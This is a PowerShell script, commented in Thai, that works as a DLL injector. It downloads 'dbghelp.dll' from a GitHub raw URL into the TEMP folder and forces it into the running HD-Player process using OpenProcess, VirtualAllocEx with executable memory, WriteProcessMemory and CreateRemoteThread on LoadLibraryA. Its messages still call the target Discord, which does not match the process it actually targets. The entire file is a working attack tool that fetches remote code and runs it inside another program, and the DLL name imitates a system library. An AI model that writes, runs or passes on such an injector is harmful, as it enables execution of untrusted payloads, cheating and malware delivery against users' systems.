# --- CONFIGURATION ---
$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/dbghelp.dll" 
$tempPath = "$env:TEMP\dbghelp.dll"
$processName = "HD-Player"

# 1. ดาวน์โหลด DLL จากลิงก์
try {
    Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -Force -ErrorAction Stop
} catch {
    Write-Host "[-] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
    return
}

# 2. ตรวจสอบ Process Discord
# Discord มักจะมีหลาย Process (PID) เราจะเลือกเอาตัวแรกที่เจอ
$allProcesses = Get-Process $processName -ErrorAction SilentlyContinue

if (-not $allProcesses) {
    Write-Host "[-] HD-PLAYER is not running! Please open Discord first." -ForegroundColor Red
    return
}

# เลือก Process แรกจากรายการที่พบ
$targetProcess = $allProcesses[0]

# 3. นิยามฟังก์ชัน Windows API ด้วย C#
$Source = @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

if (-not ([System.Management.Automation.PSTypeName]"Injector").Type) {
    Add-Type -TypeDefinition $Source
}

# 4. เริ่มกระบวนการ Injection
try {
    Write-Host "[*] Target Found: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Yellow
    Write-Host "[*] Injecting DLL..." -ForegroundColor Cyan

    # เปิด Process Handle (PROCESS_ALL_ACCESS = 0x1F0FFF)
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
    
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Host "[-] Could not get handle to Discord. Try running PowerShell as Administrator." -ForegroundColor Red
        return
    }

    # จองพื้นที่ใน Memory
    $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
    $allocMem = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllPathBytes.Length, 0x3000, 0x40)

    # เขียนที่อยู่ DLL ลงใน Memory
    $bytesWritten = [IntPtr]::Zero
    $success = [Injector]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$bytesWritten)

    if ($success) {
        $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
        $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
        
        if ($hThread -ne [IntPtr]::Zero) {
            Write-Host "[+] DLL Successfully Injected into Discord!" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed to create remote thread." -ForegroundColor Red
        }
    } else {
        Write-Host "[-] Failed to write memory to process." -ForegroundColor Red
    }
} catch {
    Write-Host "[-] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
}

# ลบไฟล์ DLL (ทางเลือก: หากต้องการลบทันทีอาจติด Error เพราะ Discord กำลังใช้งานอยู่)
# Remove-Item $tempPath -ErrorAction SilentlyContinue
